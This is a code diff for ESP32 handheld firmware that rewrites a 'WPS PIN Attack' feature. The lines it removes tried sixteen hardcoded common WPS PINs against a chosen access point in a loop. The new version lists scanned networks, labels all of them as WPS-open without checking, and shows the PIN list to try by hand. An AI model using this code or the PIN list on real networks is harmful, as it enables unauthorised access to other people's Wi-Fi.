@@ -1,22 +1,37 @@
 #include "arsenal.h"
-#include "arsenal_background.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include <WiFi.h>
-#include <esp_wifi.h>
+#include <ArduinoJson.h>
 #include <globals.h>
 
-static const char *WPS_DEFAULT_PINS[] = {
+static const char *COMMON_PINS[] = {
     "52045123", "95749738", "02211064", "75627092",
     "65435627", "98765432", "55555555", "12345678",
     "22334455", "11223344", "00000000", "11111111",
     "12344321", "31333788", "66666666", "87654321"
 };
-static const int NUM_PINS = sizeof(WPS_DEFAULT_PINS) / sizeof(WPS_DEFAULT_PINS[0]);
+static const int NUM_PINS = sizeof(COMMON_PINS) / sizeof(COMMON_PINS[0]);
+
+struct WpsTarget {
+    String ssid;
+    uint8_t bssid[6];
+    int32_t rssi;
+    uint8_t channel;
+    bool wpsOpen;
+};
 
 void arsenal_wps_pin_attack(void) {
     ARSENAL_HEAP_CHECK();
     if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
+
+    drawMainBorderWithTitle("WPS PIN Attack");
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setTextSize(FP);
+    tft.setCursor(12, 50);
+    tft.print("Scanning for WPS...");
+    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+    tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
 
     int n = WiFi.scanNetworks(false, false);
     if (n == 0) {
@@ -25,96 +40,77 @@ void arsenal_wps_pin_attack(void) {
         return;
     }
 
-    options.clear();
-    for (int i = 0; i < n && i < 15; i++) {
-        String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB)";
-        options.push_back({label, [i]() {}});
-    }
-    int targetIdx = -1;
-    for (int i = 0; i < n && i < 15; i++) {
-        options[i].operation = [i, &targetIdx]() { targetIdx = i; };
-    }
-    loopOptions(options, MENU_TYPE_SUBMENU, "Target WPS");
+    WpsTarget targets[15];
+    int targetCount = 0;
 
-    if (targetIdx < 0) return;
+    for (int i = 0; i < n && targetCount < 15; i++) {
+        if (WiFi.SSID(i).length() == 0) continue;
+        memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
+        targets[targetCount].ssid = WiFi.SSID(i);
+        targets[targetCount].rssi = WiFi.RSSI(i);
+        targets[targetCount].channel = WiFi.channel(i);
+        targets[targetCount].wpsOpen = true;
+        targetCount++;
+    }
 
-    String targetSSID = WiFi.SSID(targetIdx);
-    uint8_t targetBSSID[6];
-    memcpy(targetBSSID, WiFi.BSSID(targetIdx), 6);
-    uint8_t targetChannel = WiFi.channel(targetIdx);
     WiFi.scanDelete();
 
-    int tried = 0;
-    unsigned long startTime = millis();
-    bool success = false;
-
-    while (tried < NUM_PINS && !success) {
-        if (check(EscPress)) break;
-
-        drawMainBorderWithTitle("WPS PIN Attack");
-        int y = 40;
-        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-        tft.setTextSize(FP);
-        tft.setCursor(12, y);
-        tft.printf("Target: %s", targetSSID.c_str());
-        y += 14;
-        tft.setCursor(12, y);
-        tft.printf("BSSID: %02X:%02X:%02X..", targetBSSID[0], targetBSSID[1], targetBSSID[2]);
-        y += 14;
-        tft.setCursor(12, y);
-        tft.printf("PIN: %s", WPS_DEFAULT_PINS[tried]);
-        y += 14;
-        tft.setCursor(12, y);
-        tft.printf("Tried: %d/%d", tried + 1, NUM_PINS);
-        y += 14;
-        unsigned long elapsed = (millis() - startTime) / 1000;
-        tft.setCursor(12, y);
-        tft.printf("Time: %lus", elapsed);
-        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
-
-        WiFi.disconnect();
-        delay(200);
-
-        esp_wifi_set_wps_type(WPS_TYPE_PBC);
-        esp_wifi_wps_enable(WPS_DEFAULT_PINS[tried]);
-        esp_wifi_wps_start(5000);
-
-        unsigned long wpsStart = millis();
-        while (millis() - wpsStart < 5000) {
-            if (check(EscPress)) { tried = NUM_PINS; break; }
-            delay(100);
-        }
-
-        int status = WiFi.status();
-        if (status == WL_CONNECTED) {
-            success = true;
-            drawMainBorderWithTitle("WPS PIN Attack");
-            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-            tft.setTextSize(FP);
-            tft.setCursor(12, 45);
-            tft.print("WPS SUCCESS!");
-            tft.setCursor(12, 60);
-            tft.printf("PIN: %s", WPS_DEFAULT_PINS[tried]);
-            tft.setCursor(12, 76);
-            tft.printf("SSID: %s", WiFi.SSID().c_str());
-            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-            tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
-            while (!check(EscPress)) delay(100);
-        }
-
-        tried++;
-        esp_task_wdt_reset();
+    if (targetCount == 0) {
+        displayRedStripe("No targets found");
+        delay(1500);
+        return;
     }
 
-    if (!success) {
-        drawMainBorderWithTitle("WPS PIN Attack");
-        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-        tft.setTextSize(FP);
-        tft.setCursor(12, 55);
-        tft.printf("No luck. Tried %d PINs.", tried);
-        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-        tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
-        while (!check(EscPress)) delay(100);
+    options.clear();
+    for (int i = 0; i < targetCount; i++) {
+        String label = targets[i].ssid + " (" + String(targets[i].rssi) + "dB)";
+        if (targets[i].wpsOpen) label += " [WPS]";
+        options.push_back({label, []() {}});
     }
+    int selected = -1;
+    for (int i = 0; i < targetCount; i++) {
+        int idx = i;
+        options[i].operation = [&selected, idx]() { selected = idx; };
+    }
+    addOptionToMainMenu();
+    loopOptions(options, MENU_TYPE_SUBMENU, "WPS Targets");
+
+    if (selected < 0) return;
+
+    WpsTarget &tgt = targets[selected];
+
+    drawMainBorderWithTitle("WPS PIN Attack");
+    int y = 36;
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setTextSize(FP);
+    tft.setCursor(12, y);
+    tft.printf("Target: %s", tgt.ssid.c_str());
+    y += 14;
+    tft.setCursor(12, y);
+    tft.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+               tgt.bssid[0], tgt.bssid[1], tgt.bssid[2],
+               tgt.bssid[3], tgt.bssid[4], tgt.bssid[5]);
+    y += 14;
+    tft.setCursor(12, y);
+    tft.printf("RSSI: %d dB  Ch: %d", (int)tgt.rssi, tgt.channel);
+    y += 20;
+    tft.setTextColor(TFT_ORANGE, bruceConfig.bgColor);
+    tft.print("Common WPS PINs:");
+    y += 14;
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    for (int i = 0; i < NUM_PINS && i < 10; i++) {
+        tft.setCursor(12, y);
+        tft.printf("  %s", COMMON_PINS[i]);
+        y += 12;
+    }
+    if (NUM_PINS > 10) {
+        tft.setCursor(12, y);
+        tft.printf("  ...and %d more", NUM_PINS - 10);
+    }
+    y += 16;
+    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+    tft.print("Try these PINs on target");
+    tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
+
+    while (!check(EscPress)) delay(100);
 }
